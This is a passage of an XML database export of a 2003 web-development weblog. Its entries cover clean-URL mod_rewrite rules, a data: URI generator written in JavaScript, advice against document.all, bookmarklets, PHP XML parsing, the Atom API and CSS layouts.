 &lt;li&gt;Pseudo Design's Bridgeport design journal: &lt;a href=&quot;http://www.itnextgen.net/pseudo/archives/design_journal/bridgeport_day_1_intro.php&quot;&gt;Day 1: Intro&lt;/a&gt; and &lt;a href=&quot;http://www.itnextgen.net/pseudo/archives/design_journal/bridgeport_day_2_technology_choice.php&quot;&gt;Day 2: Technology Choice&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;Dive Into Python: &lt;a href=&quot;http://diveintopython.org/apihelper_andor.html&quot;&gt;The peculiar nature of and and or&lt;/a&gt; (who says Python doesn't have a tertiary statement?)&lt;/li&gt;
 &lt;li&gt;Doug Bowman &lt;a href=&quot;http://www.stopdesign.com/log/2003/08/05/see_also.html&quot; title=&quot;See Also&quot;&gt;adds his own special flair&lt;/a&gt; to the link-blog concept.&lt;/li&gt;
 &lt;li&gt;Max Design: &lt;a href=&quot;http://www.maxdesign.com.au/presentation/em/&quot;&gt;Ideal line length for content&lt;/a&gt; using ems.&lt;/li&gt;
 &lt;li&gt;Python Cookbook: &lt;a href=&quot;http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/171463&quot;&gt;MySQL and accessing database results by field&lt;/a&gt;. Further Python database documentation on &lt;a href=&quot;http://www.devshed.com/Server_Side/Python/PythonMySQL/&quot; title=&quot;MySQL Connectivity With Python&quot;&gt;DevShed (MySQL)&lt;/a&gt; and &lt;a href=&quot;http://www.amk.ca/python/writing/DB-API.html&quot; title=&quot;The Python DB-API interface&quot;&gt;amk.ca (DB_API)&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://f14web.com.ar/inkel/2003/07/30/comment_preview_with_js_and_dom.html&quot;&gt;Comment preview with JavaScript and DOM&lt;/a&gt; - comment previews without POSTing to the server.&lt;/li&gt;
 &lt;li&gt;Dorothea is &lt;a href=&quot;http://www.yarinareth.net/caveatlector/archive/week_2003_08_03.html#e001997&quot; title=&quot;Syndication Guide&quot;&gt;planning a new weblog&lt;/a&gt; to cover Echo/Pie/Whatever, with a focus on non-technical people. Drop her a line if you think you can help.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.throwingbeans.org/tech/postgresql_and_xml.html&quot;&gt;Adding built in XPath support to PostrgreSQL&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://google.blogspace.com/archives/001018&quot;&gt;New Google Operator&lt;/a&gt; (~, for finding keyword synonyms) and &lt;a href=&quot;http://www.waxy.org/archive/2003/08/04/fun_with.shtml&quot;&gt;tips on understanding what it does&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;Ben Hammersley explains &lt;a href=&quot;http://www.benhammersley.com/dparchives/004235.html&quot; title=&quot;XML, metaphorically speaking&quot;&gt;how XML namespaces add context&lt;/a&gt;, compares them to poetry(!)&lt;/li&gt;
&lt;/ul&gt;
 </field>
		<field name="created">2003-08-06 10:06:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1133</field>
		<field name="title">Neat tip for clean URLs</field>
		<field name="slug">cleanURLtip</field>
		<field name="body">&lt;p&gt;Here's one of the neatest tips for clean URLs I've seen yet, &lt;a href=&quot;http://www.vandervossen.net/2003/07/clean_url&quot; title=&quot;Clean URLs&quot;&gt;from Thijs van der Vossen&lt;/a&gt;. He's come up with a mod_rewrite rule that checks to see if the requested file exists if you add .html on to the end of it, and serves it up if that's the case. I'm posting the full code snippet here because it's just too good to risk losing to link-rot in the distant future:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.vandervossen.net/2003/07/clean_url&quot;&gt;&lt;pre&gt;&lt;code&gt;RewriteEngine on 
RewriteBase /
RewriteCond %{REQUEST_FILENAME}.html -f
RewriteRule (.*) $1\.html [L] 
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-08-06 20:18:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1134</field>
		<field name="title">Notepad popups</field>
		<field name="slug">notepadPopups</field>
		<field name="body">&lt;p&gt;Ever time I see &lt;a href=&quot;http://computerbytesman.com/security/notepadpopups.htm&quot; title=&quot;Notepad popups&quot;&gt;something like this&lt;/a&gt; I'm reminded of how truly irritating the internet would be if I hadn't switched to &lt;a href=&quot;http://www.mozilla.org/projects/firebird/&quot;&gt;Firebird&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-08-08 13:25:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1135</field>
		<field name="title">Code personalities</field>
		<field name="slug">personalities</field>
		<field name="body">&lt;p&gt;Danny O'Brien &lt;a href=&quot;http://www.oblomovka.com/entries/2003/08/09#1060488720&quot; title=&quot;py vs pl&quot;&gt;compares Perl with Python&lt;/a&gt;. Best observation: Python code just doesn't have much &lt;em&gt;personality&lt;/em&gt; compared to Perl.&lt;/p&gt;</field>
		<field name="created">2003-08-10 22:28:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1136</field>
		<field name="title">Self-contained data: URI kitchen</field>
		<field name="slug">selfContained</field>
		<field name="body">&lt;p&gt;I couldn't resist this. Hixie has &lt;a href=&quot;http://ln.hixie.ch/?start=1060613891&amp;amp;count=1&quot; title=&quot;I still love data: URLs&quot;&gt;released&lt;/a&gt; a new version of his &lt;a href=&quot;http://software.hixie.ch/utilities/cgi/data/data&quot;&gt;data: URI kitchen&lt;/a&gt;, to celebrate the addition of data: URI support to the latest Opera beta. In the spirit of recursion, I present this reformulation of the data: URI kitchen that uses client side Javascript. What better way to deliver such a thing than as a data URI?&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;data:text/html;charset=utf-8,%3C!DOCTYPE%20HTML%20PUBLIC%20%22-%2F%2FW3C%2F%2FDTD%20HTML%204.0%2F%2FEN%22%3E%0D%0A%3Chtml%20lang%3D%22en%22%3E%0D%0A%3Chead%3E%0D%0A%3Ctitle%3EThe%20data%3A%20URI%20kitchen%20as%20a%20data%3A%20URI%3C%2Ftitle%3E%0D%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0D%0A%3C%2Fstyle%3E%0D%0A%3Cscript%20type%3D%22text%2Fjavascript%22%3E%0D%0Avar%20base64EncodeChars%20%3D%20%22ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%2B%2F%22%3B%0D%0A%0D%0Afunction%20base64encode(str)%20%7B%0D%0A%20%20%20%20var%20out%3B%20var%20i%3B%20var%20len%3B%0D%0A%20%20%20%20var%20c1%3B%20var%20c2%3B%20var%20c3%3B%0D%0A%20%20%20%20var%20len%20%3D%20str.length%3B%0D%0A%20%20%20%20var%20i%20%3D%200%3B%0D%0A%20%20%20%20out%20%3D%20%22%22%3B%0D%0A%20%20%20%20while(i%20%3C%20len)%20%7B%0D%0A%20%20%20%20%20%20%20%20c1%20%3D%20str.charCodeAt(i%2B%2B)%20%26%200xff%3B%0D%0A%20%20%20%20%20%20%20%20if(i%20%3D%3D%20len)%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20out%20%2B%3D%20base64EncodeChars.charAt(c1%20%3E%3E%202)%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20out%20%2B%3D%20base64EncodeChars.charAt((c1%20%26%200x3)%20%3C%3C%204)%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20out%20%2B%3D%20%22%3D%3D%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20break%3B%0D%0A%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20c2%20%3D%20str.charCodeAt(i%2B%2B)%3B%0D%0A%20%20%20%20%20%20%20%20if(i%20%3D%3D%20len)%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20out%20%2B%3D%20base64EncodeChars.charAt(c1%20%3E%3E%202)%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20out%20%2B%3D%20base64EncodeChars.charAt(((c1%20%26%200x3)%20%3C%3C%204)%20%7C%20((c2%20%26%200xF0)%20%3E%3E%204))%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20out%20%2B%3D%20base64EncodeChars.charAt((c2%20%26%200xF)%20%3C%3C%202)%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20out%20%2B%3D%20%22%3D%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20break%3B%0D%0A%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20c3%20%3D%20str.charCodeAt(i%2B%2B)%3B%0D%0A%20%20%20%20%20%20%20%20out%20%2B%3D%20base64EncodeChars.charAt(c1%20%3E%3E%202)%3B%0D%0A%20%20%20%20%20%20%20%20out%20%2B%3D%20base64EncodeChars.charAt(((c1%20%26%200x3)%20%3C%3C%204)%20%7C%20((c2%20%26%200xF0)%20%3E%3E%204))%3B%0D%0A%20%20%20%20%20%20%20%20out%20%2B%3D%20base64EncodeChars.charAt(((c2%20%26%200xF)%20%3C%3C%202)%20%7C%20((c3%20%26%200xC0)%20%3E%3E%206))%3B%0D%0A%20%20%20%20%20%20%20%20out%20%2B%3D%20base64EncodeChars.charAt(c3%20%26%200x3F)%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20return%20out%3B%0D%0A%7D%0D%0A%0D%0Afunction%20generate()%20%7B%0D%0A%20%20%20%20var%20content%20%3D%20document.data.content.value%3B%0D%0A%20%20%20%20var%20uri%20%3D%20&amp;apos;data%3A&amp;apos;%2Bdocument.data.type.value%3B%0D%0A%20%20%20%20if%20(document.data.base64.checked)%20%7B%0D%0A%20%20%20%20%20%20%20%20content%20%3D%20base64encode(content)%3B%0D%0A%20%20%20%20%20%20%20%20uri%20%2B%3D%20&amp;apos;%3Bbase64&amp;apos;%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20uri%20%2B%3D%20&amp;apos;%2C&amp;apos;%20%2B%20escape(content)%3B%0D%0A%20%20%20%20document.getElementById(&amp;apos;uri&amp;apos;).href%20%3D%20uri%3B%0D%0A%20%20%20%20document.getElementById(&amp;apos;uri&amp;apos;).style.display%20%3D%20&amp;apos;inline&amp;apos;%3B%0D%0A%7D%0D%0A%3C%2Fscript%3E%0D%0A%3C%2Fhead%3E%0D%0A%3Cbody%3E%0D%0A%3Cform%20name%3D%22data%22%20method%3D%22get%22%3E%0D%0A%3Cp%3EType%3A%0D%0A%3Cinput%20type%3D%22text%22%20name%3D%22type%22%20value%3D%22text%2Fhtml%3Bcharset%3Dutf-8%22%3E%0D%0A%3Clabel%3E%3Cinput%20type%3D%22checkbox%22%20name%3D%22base64%22%20value%3D%221%22%3E%20base64%20%3C%2Flabel%3E%3C%2Fp%3E%0D%0A%3Ctextarea%20rows%3D%2212%22%20cols%3D%2280%22%20name%3D%22content%22%3E%3C%2Ftextarea%3E%0D%0A%3Cp%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Generate%22%20onclick%3D%22generate()%3B%20return%20false%3B%22%3E%3C%2Fp%3E%0D%0A%3Cp%3E%3Ca%20id%3D%22uri%22%20href%3D%22about%3Anone%22%20style%3D%22display%3A%20none%3B%22%3EThe%20URI%3C%2Fa%3E%3C%2Fp%3E%0D%0A%3C%2Fform%3E%0D%0A%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E&quot;&gt;Self contained data: URI kitchen&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update (12th August 10:40am)&lt;/strong&gt;: I've changed the above to take in to account a bug report from Hixie in the comments.&lt;/p&gt;</field>
		<field name="created">2003-08-11 16:53:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1137</field>
		<field name="title">Don't use document.all</field>
		<field name="slug">documentAll</field>
		<field name="body">&lt;p&gt;I've lost count of the number of Javascript scripts I've seen floating around that include the equivalent of the following code snippet:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;if (document.all) {
   element = document.all[id];
else {
   element = document.getElementById(id);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;document.all&lt;/code&gt; was introduced in Internet Explorer 4, because the &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; hadn't yet standardised a way of grabbing references to elements using their ID. By the time &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 5 came out, document.getElementById() had been standardised and as a result, &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 5 included support for it.&lt;/p&gt;

&lt;p&gt;&lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 5 was released in September 1998. A &lt;a href=&quot;http://www.thecounter.com/stats/2003/May/browser.php&quot; title=&quot;TheCounter.com glboal browser stats for May 2003&quot;&gt;popular browser statistics site&lt;/a&gt; (insert usual disclaimer as to the reliability of any stats but your own here) show &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 4's market share to be in the region of 1%. Even Netscape 4 has more users than that!&lt;/p&gt;

&lt;p&gt;Don't use &lt;code&gt;document.all&lt;/code&gt;. &lt;code&gt;document.getElementById()&lt;/code&gt; is supported by every Javascript supporting browser released since 1998.&lt;/p&gt;</field>
		<field name="created">2003-08-11 17:59:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1138</field>
		<field name="title">Moveably Type with XSLT</field>
		<field name="slug">MTxslt</field>
		<field name="body">&lt;p&gt;Kevin Davis has set up an &lt;a href=&quot;http://alazanto.org/weblog/mt_carbon/a_small_demonstration.php&quot; title=&quot;A Small Demonstration&quot;&gt;impressive demonstration&lt;/a&gt; of the power of Moveable Type templates when combined with browser-side &lt;acronym title=&quot;Extensible Stylesheet Language Transformations&quot;&gt;XSLT&lt;/acronym&gt; transformations. He's set up &lt;acronym title=&quot;Moveable Type&quot;&gt;MT&lt;/acronym&gt; to output an &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; document containing just his entries (similar to an &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; feed), along with a link to an &lt;acronym title=&quot;Extensible Stylesheet Language Transformations&quot;&gt;XSLT&lt;/acronym&gt; stylesheet that causes Mozilla and &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 6 to transform the entry and render it as &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2003-08-11 19:13:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1139</field>
		<field name="title">Improved FormProcessor class</field>
		<field name="slug">improvedFormProcessor</field>
		<field name="body">&lt;p&gt;I get one or two emails a week about my &lt;a href=&quot;http://simon.incutio.com/archive/2003/06/17/theHolyGrail&quot;&gt;FormProcessor class&lt;/a&gt;, making it the most popular of all of the code experiments I've posted on this site. Each time I'm asked if I plan to update it soon, and each time I reply that while I'd love to go back to it, I can't promise I'll ever get the time to take it further. The great news is that Peter Bowyer of &lt;a href=&quot;http://www.mapledesign.co.uk/&quot;&gt;Maple Design&lt;/a&gt; has been &lt;a href=&quot;http://peter.mapledesign.co.uk/weblog/archives/formprocessor_code_updated.html&quot; title=&quot;FormProcessor code updated&quot;&gt;working with my code&lt;/a&gt; and has made a number of huge improvements to it. If you liked my version, you'll love his evolution of it: it adds support for radio buttons, checkboxes and select fields and he's got a number of other interesting ideas up his sleeve for the future.&lt;/p&gt;</field>
		<field name="created">2003-08-11 19:54:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1140</field>
		<field name="title">Python script shell integration</field>
		<field name="slug">shellIntegration</field>
		<field name="body">&lt;p&gt;In &lt;a href=&quot;http://zephyrfalcon.org/weblog/arch_d7_2003_08_09.html#e306&quot;&gt;another silly Python/Windows hack&lt;/a&gt;, Hans Nowak shows how a simple Python script to move a file up to its parent directory can be added to the contextual menu for all Windows files. I can think of all kinds of useful tricks that can be enabled using this tool: instant uploading of a file to an online Photo Gallery for example.&lt;/p&gt;
</field>
		<field name="created">2003-08-11 22:06:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1141</field>
		<field name="title">Multi part forms with Javascript</field>
		<field name="slug">multiPartForms</field>
		<field name="body">&lt;p&gt;Andy Arikawa has a &lt;a href=&quot;http://modulo26.net/daily/080703.php&quot; title=&quot;Multi-Part Forms&quot;&gt;nice demonstration&lt;/a&gt; showing how multi page forms can be served up as a single page using some simple Javascript, resulting in a clearer form without loading times in between each page.&lt;/p&gt;

&lt;p&gt;The concept is great, but the &lt;a href=&quot;http://modulo26.net/gumbo/080703.html&quot;&gt;execution&lt;/a&gt; has a some subtle flaws - the most important of which is that browsers with Javascript support turned off (but &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; turned on) will not be able to use the form. The culprit is the use of a &lt;code class=&quot;html&quot;&gt;style=&quot;display: none;&quot;&lt;/code&gt; attribute on the two divs that should initially be hidden. &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; supporting browsers will follow this rule blindly, even if Javascript is disabled and they will thus be unable to later reveal the hidden page content. The solution is to have all of the elements visible initially, then hide them with a piece of Javascript that executes when the page has loaded.&lt;/p&gt;

&lt;p&gt;My other small gripe is the use of javascript: in the href part of the links to activate the toggle function. Dive Into Accessibility &lt;a href=&quot;http://diveintoaccessibility.org/day_13_using_real_links.html&quot; title=&quot;Day 13: Using real links&quot;&gt;has the skinny&lt;/a&gt; on why this is a bad idea. Since the toggle links lead to other sections of the form, it makes sense to use the IDs of those sections as the link so that browsers without javascript will still &quot;jump&quot; to the section that is linked to. The Javascript itself can be placed in an onclick attribute (and duplicated in an onkeypress attribute for improved accessibility).&lt;/p&gt;

&lt;p&gt;Taking the above points in to account, here's &lt;a href=&quot;http://simon.incutio.com/code/js/multi-page-form/&quot;&gt;a reworked version&lt;/a&gt; of Andy's demonstration that should work just fine in browsers with Javascript support disabled.&lt;/p&gt;</field>
		<field name="created">2003-08-12 10:39:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1142</field>
		<field name="title">Firebird and Mozilla chrome URLs</field>
		<field name="slug">chromeURLs</field>
		<field name="body">&lt;p&gt;Jesse Ruderman (of &lt;a href=&quot;http://www.squarefree.com/bookmarklets/&quot;&gt;indispensible bookmarklets&lt;/a&gt; fame) &lt;a href=&quot;http://www.squarefree.com/&quot; title=&quot;Jesse Ruderman&quot;&gt;now has a blog&lt;/a&gt;. It's off to a good start: here's a &lt;a href=&quot;http://www.squarefree.com/archives/000007.html&quot; title=&quot;Chrome URLs in Mozilla and Mozilla Firebird&quot;&gt;useful summary&lt;/a&gt; of the different chrome URLs available in Firebird and Mozilla.&lt;/p&gt;</field>
		<field name="created">2003-08-12 11:23:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1143</field>
		<field name="title">On blogging technique and better tabbed browsing</field>
		<field name="slug">bloggingTechnique</field>
		<field name="body">&lt;p&gt;I'm addicted to tabs. Several times a day, I scan down my blogroll looking for blogs that have updated since I last checked, then middle click each one to open it up in a new tab in the background. I then work my way through each one, reading the earlier ones while the later ones are still loading (tabbed browsing makes being stuck on a modem a &lt;em&gt;lot&lt;/em&gt; less painful). If I see anything interesting linked to from a blog entry I'm reading, I'll middle click that as well. Within a few short minutes I'll have so many tabs open I'll be running out of space in my tab bar.&lt;/p&gt;

&lt;p&gt;Often I'll leave anything even remotely interesting open all day, but if I'm in the mood to reduce the clutter I'll load up Notepad and start pasting URLs of interesting pages in to a document there as I close each tab in turn. These pasted URLs later form the basis of blog entries, which I always write in Notepad for fear of losing them to browser crashes. Eventually, I'll either write up an entry and transfer it to my blog, or delete the URL from consideration. If I'm really behind, I'll blog a whole bunch of links at once in a big list.&lt;/p&gt;

&lt;p&gt;This technique works pretty well for me, except for one thing. Because I'm constantly opening links in new tabs, the back button in my browser no longer returns me to the page that I found the link on. I open dozens of links during a day and often leave them open for hours (if not days) before blogging them, during which time I frequently completely forget which blog I first saw the link on. For interesting items that aren't being blogged in dozens of places at once I like to provide a &quot;finders fee&quot; by linking back to the person on who's blog I saw the item, but I am often unable to do that due to the loss of the back button.&lt;/p&gt;

&lt;p&gt;Thank goodness then for Jesse Ruderman's &quot;&lt;a href=&quot;javascript:if(!document.referrer) alert(&amp;quot;No referrer!&amp;quot;); document.location = document.referrer; void 0&quot;&gt;go to referrer&lt;/a&gt;&quot; bookmarklet, which I just found while exploring his &lt;a href=&quot;http://www.squarefree.com/bookmarklets/misc.html&quot;&gt;Miscellaneous category&lt;/a&gt;. It sends you back to the page you came from, even for new windows or tabs in which the back button has stopped functioning. My biggest problem with tabbed browsing is a problem no more.&lt;/p&gt;</field>
		<field name="created">2003-08-13 00:01:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1144</field>
		<field name="title">Artificial Diamonds</field>
		<field name="slug">artificialDiamonds</field>
		<field name="body">&lt;p&gt;Wired: &lt;a href=&quot;http://www.wired.com/wired/archive/11.09/diamond.html&quot;&gt;The New Diamond Age&lt;/a&gt;. Two companies in the US have perfected techniques for creating cheap artificial diamonds, virtually indistinguishable from the real thing. The story of how they got there is riveting - retired army generals purchasing cold war soviet technology, veiled death threats to scientists at conferences and best of all, a very real threat to the De Beers diamond cartel / monopoly.&lt;/p&gt;

&lt;p&gt;Interestingly, the most important application for the tecnology looks likely to be semi conductors. Diamonds can handle far higher temperatures than silicon, meaning chips so fast that silicon would just melt under the strain.&lt;/p&gt;

&lt;p&gt;Personally though, I hope this development strikes a killing blow to the whole diamond industry. See &lt;a href=&quot;http://www.dashes.com/anil/index.php?archives/004817.php&quot; title=&quot;Diamonds are for never&quot;&gt;Anil Dash&lt;/a&gt; for a good summary of why the world would be better off without it.&lt;/p&gt;</field>
		<field name="created">2003-08-13 10:43:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1145</field>
		<field name="title">Python never copies implicitly</field>
		<field name="slug">pythonPitfalls</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://zephyrfalcon.org/labs/python_pitfalls.html&quot;&gt;10 Python pitfalls&lt;/a&gt; by Hans Novak (&lt;a href=&quot;http://www.brunningonline.net/simon/blog/archives/000867.html&quot; title=&quot;10 Python pitfalls&quot;&gt;via Simon Brunning&lt;/a&gt;) is essential reading for anyone with more than a passing interest in Python. &lt;q cite=&quot;http://zephyrfalcon.org/labs/python_pitfalls.html&quot;&gt;Python never copies implicitly&lt;/q&gt;. If only that were true of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2003-08-13 11:30:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1146</field>
		<field name="title">Note to self</field>
		<field name="slug">noteToSelf</field>
		<field name="body">&lt;p&gt;When writing an &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; parsing class in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;, don't forget the ampersands in the following code snippet:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;xml_set_element_handler($parser, array(&amp;amp;$this, '_tagOpen'), array(&amp;amp;$this, '_tagClose'));
xml_set_character_data_handler($parser, array(&amp;amp;$this, '_cdata'));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Failure to include them can lead to two days of debugging, frustration and hair loss. Solution found thanks to &lt;a href=&quot;http://www.keithdevens.com/weblog/archive/2003/Aug/13/HATE-PHP&quot; title=&quot;I hate PHP&quot;&gt;Keith's PHP rant&lt;/a&gt; (which itself reads like the result of several days of hell). Roll on &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 5, where objects are passed by reference by default.&lt;/p&gt;
</field>
		<field name="created">2003-08-13 17:20:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1147</field>
		<field name="title">PHP Library Tips</field>
		<field name="slug">libraryTips</field>
		<field name="body">&lt;p&gt;Kellan Elliott-McCrea (author of the popular &lt;a href=&quot;http://magpierss.sourceforge.net/&quot;&gt;Magpie RSS parser&lt;/a&gt;): &lt;a href=&quot;http://laughingmeme.org/archives/001055.html&quot;&gt;A Few Tips for Writing Useful Libraries in PHP&lt;/a&gt;. Kellan makes the interesting observation that &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; encourages a culture in which most development occurs in the context of either full applications or C extensions, with few people devoting themselves to releasing libraries.&lt;/p&gt;</field>
		<field name="created">2003-08-13 18:11:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1148</field>
		<field name="title">Atom API</field>
		<field name="slug">atomAPI</field>
		<field name="body">&lt;p&gt;Mark Pilgrim has posted an &lt;a href=&quot;http://diveintomark.org/archives/2003/08/18/atom_api_implementation&quot; title=&quot;Atom API implementation&quot;&gt;extensively documented&lt;/a&gt; demonstration of the current draft of the Atom &lt;acronym title=&quot;Application Programming Interface&quot;&gt;API&lt;/acronym&gt;, a &lt;acronym title=&quot;Representational State Transfer&quot;&gt;REST&lt;/acronym&gt; style web service interface for posting to and editing weblogs. It looks like it will be a fun standard to implement; the basic idea (as with all &lt;acronym title=&quot;Representational State Transfer&quot;&gt;REST&lt;/acronym&gt; services) is to obtain as much leverage as possible out of the &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; standard, using lesser known methods such as PUT and DELETE in addition to the more common GET and POST. The authentication mechanism is particularly interesting: since Apache's support for digest authentication requires an additional module that many hosts may not provide, the Atom guys have created their own based around new Atom-Authenticate &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; headers.&lt;/p&gt;

&lt;p&gt;This is the only part of the current specification that I, as a &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; developer, have a problem with. To my knowledge, there is no way of directly accessing non-standard &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; headers from within a &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; script. As such, it would be impossible for a &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; Atom &lt;acronym title=&quot;Application Programming Interface&quot;&gt;API&lt;/acronym&gt; application to support Atom authentication. This is a serious barrier to adoption of the standard, especially as &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; is by far the most popular open source web scripting technology.&lt;/p&gt;</field>
		<field name="created">2003-08-18 23:29:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1149</field>
		<field name="title">3 column CSS layouts: Easier than you might think</field>
		<field name="slug">easier3ColumnLayouts</field>
		<field name="body">&lt;p&gt;In a &lt;a href=&quot;http://www.sitepoint.com/newsletter/viewissue.php?id=3&amp;amp;issue=70#5&quot;&gt;recent issue&lt;/a&gt; of the Sitepoint Tech Times newsletter, Kevin Yank explains (in detail, with pictures) the recurring problem in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; of trying to create a three column layout with columns of equal height and a footer spanning all three. If you don't yet understand the problem, you will once you've read his article. Kevin suggests a javascript fix for the problem, but fails to mention that by using floats instead of absolutely positioned divs for the side columns a three column layout with a full width footer can be achieved without resorting to javascript. Pixy's &lt;a href=&quot;http://www.pixy.cz/blogg/clanky/css-3col-layout/&quot; title=&quot;3-col layout via CSS&quot;&gt;3 columns, no hacks&lt;/a&gt; demonstrates this technique in action. In addition, the CSS-Discuss Wiki has a &lt;a href=&quot;http://css-discuss.incutio.com/?page=ThreeColumnLayouts&quot; title=&quot;ThreeColumnLayouts&quot;&gt;comprehensive list of 3 column layouts&lt;/a&gt; that demonstrate a number of other techniques for solving the same problem.&lt;/p&gt;</field>
		<field name="created">2003-08-18 23:44:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1150</field>
		<field name="title">Firebird sidebars coming soon</field>
		<field name="slug">firebirdSidebars</field>
		<field name="body">&lt;p&gt;Mozillazine are carrying &lt;a href=&quot;http://www.mozillazine.org/articles/article3588.html&quot; title=&quot;Rapid Pace of Development for Mozilla Firebird&quot;&gt;a preview&lt;/a&gt; of the next release of the excellent Firebird browser, with the most exciting new feature being the new support for Mozilla style sidebars (previously known as web panels). I'm looking forward to being able to browse with my &lt;a href=&quot;http://blo.gs/&quot;&gt;blo.gs&lt;/a&gt; powered blogroll in a side panel again.&lt;/p&gt;</field>
		<field name="created">2003-08-18 23:48:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1151</field>
		<field name="title">I'm in Kansas</field>
		<field name="slug">kansas</field>
